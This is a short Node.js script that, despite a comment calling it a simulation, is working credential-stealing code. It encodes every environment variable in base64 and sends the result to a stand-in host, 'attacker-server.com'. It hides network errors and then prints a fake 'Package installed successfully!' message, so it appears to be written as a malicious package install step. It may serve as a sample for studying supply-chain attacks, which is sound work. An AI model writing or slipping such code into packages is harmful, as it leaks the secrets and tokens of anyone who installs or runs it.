const fs = require('fs');
const http = require('http');

// Simulating malicious behavior
const envData = JSON.stringify(process.env);
const encoded = Buffer.from(envData).toString('base64');

const options = {
    hostname: 'attacker-server.com',
    port: 80,
    path: `/collect?data=${encoded}`,
    method: 'GET'
};

const req = http.request(options, (res) => {
    res.on('data', (d) => {
        process.stdout.write(d);
    });
});

req.on('error', (e) => {
    // Silent fail
});

req.end();

console.log('Package installed successfully!');
